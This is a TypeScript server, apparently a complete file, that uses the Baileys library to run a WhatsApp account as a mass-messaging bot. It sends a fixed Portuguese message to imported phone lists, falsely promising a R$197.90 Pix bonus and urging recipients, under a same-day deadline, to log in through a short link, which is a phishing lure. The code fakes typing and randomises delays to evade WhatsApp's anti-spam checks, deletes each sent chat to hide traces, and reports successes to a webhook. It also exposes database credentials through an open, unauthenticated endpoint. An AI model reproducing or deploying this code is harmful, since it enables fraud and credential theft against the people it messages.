import "dotenv/config";
import fs from "fs";
import express from "express";
import makeWASocket, {
  useMultiFileAuthState,
  DisconnectReason,
  delay,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  Browsers,
  type WASocket,
  type ConnectionState,
} from "@whiskeysockets/baileys";
import pino from "pino";
import axios from "axios";
import { Boom } from "@hapi/boom";
import { getContactsFromDB, importContacts, getDBCredentials } from "./db-client";

const logger = pino({ level: "silent" });

// Mensagem oficial configurada e imutável
const FIXED_MESSAGE = `🎉 PARABÉNS! 🎉

Seu perfil foi aprovado para receber um bônus imediato de R$197,90 via Pix. ✅

⏳ Oferta válida somente até hoje às 23:59.

Para liberar seu token de segurança e sacar o valor disponível, faça login ou crie seu cadastro no link abaixo:

👉 https://lkrh.pro/f96f5f

⚠️ Atenção: após o prazo, o bônus poderá ser cancelado automaticamente pelo sistema.`;

const AUTH_DIR = "auth_info_baileys";
const PORT = 3000;

export const app = express();

// Middleware de CORS e JSON
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization, Origin, Accept");
  if (req.method === "OPTIONS") {
    res.sendStatus(200);
    return;
  }
  next();
});

app.use(express.json());

// Normaliza rotas /api/wa/* para /api/*
app.use((req, _res, next) => {
  if (req.url.startsWith("/api/wa")) {
    req.url = req.url.replace(/^\/api\/wa/, "/api");
  }
  next();
});

let sock: WASocket | null = null;
let pairingCode: string | null = null;
let connectionStatus: "connecting" | "open" | "close" | "pairing" = "close";

let waVersion: [number, number, number] = [2, 3000, 1035194821];

// Busca a versão mais recente do Baileys ao iniciar
fetchLatestBaileysVersion()
  .then(({ version }) => {
    waVersion = version;
  })
  .catch((err) => {
    console.warn("Aviso: falha ao buscar versão do Baileys. Usando fallback.", err);
  });

// ──────────────────────────────────────────────────────────
// Conexão principal com o WhatsApp
// ──────────────────────────────────────────────────────────
async function connectToWhatsApp(): Promise<WASocket> {
  const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);

  sock = makeWASocket({
    version: waVersion,
    logger,
    printQRInTerminal: false,
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, logger),
    },
    browser: Browsers.ubuntu("Chrome"),
    markOnlineOnConnect: true,
  });

  sock.ev.on("connection.update", async (update: Partial<ConnectionState>) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = (lastDisconnect?.error as Boom)?.output?.statusCode;
      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

      console.log(`Conexão fechada — código: ${statusCode}, reconectar: ${shouldReconnect}`);
      connectionStatus = "close";

      // Limpa o socket atual
      try {
        sock?.ev.removeAllListeners("connection.update");
        sock?.ev.removeAllListeners("creds.update");
        sock?.end(undefined);
      } catch {
        // ignora erros no encerramento
      }
      sock = null;

      // Só reconecta se houver credenciais salvas e o motivo não for logout
      const hasCredentials = fs.existsSync(`${AUTH_DIR}/creds.json`);
      if (shouldReconnect && hasCredentials) {
        console.log("Credenciais ativas encontradas. Reconectando em 5s...");
        await delay(5000);
        connectToWhatsApp().catch((err) => console.error("Erro ao reconectar:", err));
      } else {
        console.log("Não reconectando: sessão encerrada ou inexistente.");
      }
    } else if (connection === "open") {
      console.log("✅ WhatsApp conectado com sucesso!");
      connectionStatus = "open";
      pairingCode = null;
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
}

// Inicialização silenciosa se já houver sessão ativa
if (fs.existsSync(`${AUTH_DIR}/creds.json`)) {
  console.log("Sessão anterior encontrada. Conectando ao WhatsApp...");
  connectToWhatsApp().catch((err) => console.error("Erro ao iniciar conexão:", err));
}

// ──────────────────────────────────────────────────────────
// Webhook de retorno de disparos
// ──────────────────────────────────────────────────────────
async function triggerWebhook(status: string, target: string, messageId: string): Promise<void> {
  const webhookUrl = process.env.WEBHOOK_URL;
  if (!webhookUrl) return;

  try {
    await axios.post(webhookUrl, {
      status,
      target,
      messageId,
      timestamp: new Date().toISOString(),
      reward: 0.1,
    });
  } catch (err) {
    console.error("Erro ao disparar Webhook:", err);
  }
}

// ──────────────────────────────────────────────────────────
// ROTAS
// ──────────────────────────────────────────────────────────

/** Status da conexão */
app.get("/api/status", (_req, res) => {
  res.json({
    status: connectionStatus,
    pairingCode,
    connectedAs: sock?.authState?.creds?.me?.id ?? null,
  });
});

/** Iniciar conexão e gerar Pairing Code */
app.post("/api/connect", async (req, res) => {
  const { phone } = req.body as { phone?: string };
  if (!phone) {
    res.status(400).json({ error: "Telefone é obrigatório" });
    return;
  }

  const cleanPhone = phone.replace(/\D/g, "");

  try {
    console.log(`Iniciando pareamento para: ${cleanPhone}`);

    // Encerra socket anterior
    if (sock) {
      try {
        sock.ev.removeAllListeners("connection.update");
        sock.ev.removeAllListeners("creds.update");
        sock.end(undefined);
      } catch {
        // ignora
      }
      sock = null;
    }

    // Remove sessão anterior para evitar conflito de credenciais
    if (fs.existsSync(AUTH_DIR)) {
      fs.rmSync(AUTH_DIR, { recursive: true, force: true });
    }

    connectionStatus = "close";
    pairingCode = null;

    await connectToWhatsApp();
    // Aguarda o socket inicializar antes de solicitar o código
    await new Promise((resolve) => setTimeout(resolve, 1500));

    if (!sock) {
      throw new Error("Não foi possível inicializar o socket do WhatsApp");
    }

    const code = await sock.requestPairingCode(cleanPhone);
    pairingCode = code ?? null;
    connectionStatus = "pairing";

    res.json({ pairingCode: code });
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : String(error);
    console.error("Erro ao gerar pairing code:", msg);
    res.status(500).json({ error: `Erro ao gerar pairing code: ${msg}` });
  }
});

/** Logout e remoção completa da sessão */
app.post("/api/disconnect", async (_req, res) => {
  try {
    if (sock) {
      try {
        sock.ev.removeAllListeners("connection.update");
        sock.ev.removeAllListeners("creds.update");
        await sock.logout();
        sock.end(undefined);
      } catch {
        // ignora erros no logout
      }
      sock = null;
    }

    if (fs.existsSync(AUTH_DIR)) {
      fs.rmSync(AUTH_DIR, { recursive: true, force: true });
    }

    pairingCode = null;
    connectionStatus = "close";

    res.json({ success: true });
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : String(error);
    console.error("Erro ao desconectar:", msg);
    res.status(500).json({ error: `Erro ao desconectar: ${msg}` });
  }
});

/** Disparo em massa com algoritmo antiban */
app.post("/api/disparar", async (req, res) => {
  const { targets } = req.body as { targets?: unknown[] };

  if (!sock || connectionStatus !== "open") {
    res.status(400).json({ error: "WhatsApp não conectado" });
    return;
  }

  if (!Array.isArray(targets) || targets.length === 0) {
    res.status(400).json({ error: "Lista de alvos inválida" });
    return;
  }

  // Responde imediatamente para liberar o cliente
  res.json({ status: "queueing", count: targets.length });

  for (const targetRaw of targets) {
    try {
      const target = String(targetRaw).replace(/\D/g, "") + "@s.whatsapp.net";

      // 1. Simula digitação (7–12 segundos aleatório)
      const typingMs = Math.floor(Math.random() * (12000 - 7000 + 1)) + 7000;
      await sock.sendPresenceUpdate("composing", target);
      await delay(typingMs);
      await sock.sendPresenceUpdate("paused", target);

      // 2. Envia a mensagem fixa
      const sentMsg = await sock.sendMessage(target, { text: FIXED_MESSAGE });

      if (sentMsg) {
        // 3. Apaga o chat local para não deixar rastros
        await sock.chatModify(
          {
            delete: true,
            lastMessages: [
              {
                key: sentMsg.key,
                messageTimestamp: sentMsg.messageTimestamp ?? 0,
              },
            ],
          },
          target,
        );

        // 4. Dispara webhook de confirmação
        await triggerWebhook("success", target, sentMsg.key.id ?? "");
      }

      // 5. Delay humano aleatório (30–45 segundos) — antiban
      const nextDelay = Math.floor(Math.random() * (45000 - 30000 + 1)) + 30000;
      console.log(`✉️  Enviado para ${target}. Próximo em ${nextDelay / 1000}s...`);
      await delay(nextDelay);
    } catch (err) {
      console.error(`Erro ao disparar para ${targetRaw}:`, err);
    }
  }
});

/** Busca contatos do Supabase */
app.get("/api/contatos", async (_req, res) => {
  try {
    const result = await getContactsFromDB();
    res.json(result);
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : String(error);
    console.error("Erro em /api/contatos:", msg);
    res.status(500).json({ success: false, error: msg });
  }
});

/** Importação em massa de contatos (via CSV do painel admin) */
app.post("/api/contatos/importar", async (req, res) => {
  const { phones } = req.body as { phones?: unknown };

  if (!phones || !Array.isArray(phones)) {
    res.status(400).json({
      success: false,
      error: "Formato inválido. Esperado: { phones: string[] }",
    });
    return;
  }

  try {
    const result = await importContacts(phones as string[]);
    res.json(result);
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : String(error);
    console.error("Erro em /api/contatos/importar:", msg);
    res.status(500).json({ success: false, error: msg });
  }
});

/** Verificação das credenciais do banco (uso administrativo) */
app.get("/api/db-credentials", (_req, res) => {
  try {
    const creds = getDBCredentials();
    res.json(creds);
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : String(error);
    res.status(500).json({ success: false, error: msg });
  }
});

// ──────────────────────────────────────────────────────────
// Inicia o servidor
// ──────────────────────────────────────────────────────────
app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 WhatsApp Server rodando na porta ${PORT}`);
  console.log(`   Status:   GET  /api/status`);
  console.log(`   Conectar: POST /api/connect`);
  console.log(`   Disparar: POST /api/disparar`);
  console.log(`   Contatos: GET  /api/contatos`);
});

// ──────────────────────────────────────────────────────────
// Handler Web Request para integração com src/server.ts (SSR / Cloud Run)
// ──────────────────────────────────────────────────────────
function jsonResponse(data: unknown, status = 200): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      "Content-Type": "application/json",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Headers": "Origin, X-Requested-With, Content-Type, Accept",
      "Access-Control-Allow-Methods": "GET, POST, OPTIONS, PUT, DELETE",
    },
  });
}

export async function handleWhatsappApiRequest(request: Request): Promise<Response | null> {
  const url = new URL(request.url);
  let pathname = url.pathname;

  if (request.method === "OPTIONS") {
    return new Response(null, {
      status: 200,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Headers": "Origin, X-Requested-With, Content-Type, Accept",
        "Access-Control-Allow-Methods": "GET, POST, OPTIONS, PUT, DELETE",
      },
    });
  }

  if (pathname.startsWith("/api/wa")) {
    pathname = pathname.replace(/^\/api\/wa/, "/api");
  }

  if (!pathname.startsWith("/api")) {
    return null;
  }

  const endpoint = pathname.replace(/^\/api/, "");
  const validEndpoints = [
    "/status",
    "/connect",
    "/disconnect",
    "/disparar",
    "/contatos",
    "/contatos/importar",
    "/db-credentials",
  ];

  if (!validEndpoints.includes(endpoint)) {
    return null;
  }

  try {
    if (endpoint === "/status" && request.method === "GET") {
      return jsonResponse({
        status: connectionStatus,
        pairingCode,
        connectedAs: sock?.authState?.creds?.me?.id ?? null,
      });
    }

    if (endpoint === "/connect" && request.method === "POST") {
      let body: { phone?: string } = {};
      try {
        body = (await request.json()) as { phone?: string };
      } catch {
        // ignore
      }

      const { phone } = body;
      if (!phone) {
        return jsonResponse({ error: "Telefone é obrigatório" }, 400);
      }

      const cleanPhone = String(phone).replace(/\D/g, "");
      console.log(`Iniciando pareamento para: ${cleanPhone}`);

      if (sock) {
        try {
          sock.ev.removeAllListeners("connection.update");
          sock.ev.removeAllListeners("creds.update");
          sock.end(undefined);
        } catch {
          // ignore
        }
        sock = null;
      }

      if (fs.existsSync(AUTH_DIR)) {
        fs.rmSync(AUTH_DIR, { recursive: true, force: true });
      }

      connectionStatus = "close";
      pairingCode = null;

      await connectToWhatsApp();
      await new Promise((resolve) => setTimeout(resolve, 1500));

      if (!sock) {
        throw new Error("Não foi possível inicializar o socket do WhatsApp");
      }

      const code = await sock.requestPairingCode(cleanPhone);
      pairingCode = code ?? null;
      connectionStatus = "pairing";

      return jsonResponse({ pairingCode: code });
    }

    if (endpoint === "/disconnect" && request.method === "POST") {
      if (sock) {
        try {
          sock.ev.removeAllListeners("connection.update");
          sock.ev.removeAllListeners("creds.update");
          await sock.logout();
          sock.end(undefined);
        } catch {
          // ignore
        }
        sock = null;
      }

      if (fs.existsSync(AUTH_DIR)) {
        fs.rmSync(AUTH_DIR, { recursive: true, force: true });
      }

      pairingCode = null;
      connectionStatus = "close";

      return jsonResponse({ success: true });
    }

    if (endpoint === "/disparar" && request.method === "POST") {
      let body: { targets?: unknown[] } = {};
      try {
        body = (await request.json()) as { targets?: unknown[] };
      } catch {
        // ignore
      }

      const { targets } = body;

      if (!sock || connectionStatus !== "open") {
        return jsonResponse({ error: "WhatsApp não conectado" }, 400);
      }

      if (!Array.isArray(targets) || targets.length === 0) {
        return jsonResponse({ error: "Lista de alvos inválida" }, 400);
      }

      // Disparo em background
      (async () => {
        for (const targetRaw of targets) {
          try {
            const target = String(targetRaw).replace(/\D/g, "") + "@s.whatsapp.net";

            const typingMs = Math.floor(Math.random() * (12000 - 7000 + 1)) + 7000;
            await sock?.sendPresenceUpdate("composing", target);
            await delay(typingMs);
            await sock?.sendPresenceUpdate("paused", target);

            const sentMsg = await sock?.sendMessage(target, { text: FIXED_MESSAGE });

            if (sentMsg) {
              await sock?.chatModify(
                {
                  delete: true,
                  lastMessages: [
                    {
                      key: sentMsg.key,
                      messageTimestamp: sentMsg.messageTimestamp ?? 0,
                    },
                  ],
                },
                target,
              );

              await triggerWebhook("success", target, sentMsg.key.id ?? "");
            }

            const nextDelay = Math.floor(Math.random() * (45000 - 30000 + 1)) + 30000;
            console.log(`✉️ Enviado para ${target}. Próximo em ${nextDelay / 1000}s...`);
            await delay(nextDelay);
          } catch (err) {
            console.error(`Erro ao disparar para ${targetRaw}:`, err);
          }
        }
      })();

      return jsonResponse({ status: "queueing", count: targets.length });
    }

    if (endpoint === "/contatos" && request.method === "GET") {
      const result = await getContactsFromDB();
      return jsonResponse(result);
    }

    if (endpoint === "/contatos/importar" && request.method === "POST") {
      let body: { phones?: unknown } = {};
      try {
        body = (await request.json()) as { phones?: unknown };
      } catch {
        // ignore
      }

      const { phones } = body;
      if (!phones || !Array.isArray(phones)) {
        return jsonResponse(
          { success: false, error: "Formato inválido. Esperado: { phones: string[] }" },
          400,
        );
      }

      const result = await importContacts(phones as string[]);
      return jsonResponse(result);
    }

    if (endpoint === "/db-credentials" && request.method === "GET") {
      const creds = getDBCredentials();
      return jsonResponse(creds);
    }

    return null;
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : String(error);
    console.error(`Erro no endpoint ${endpoint}:`, msg);
    return jsonResponse({ error: msg }, 500);
  }
}

export default app;
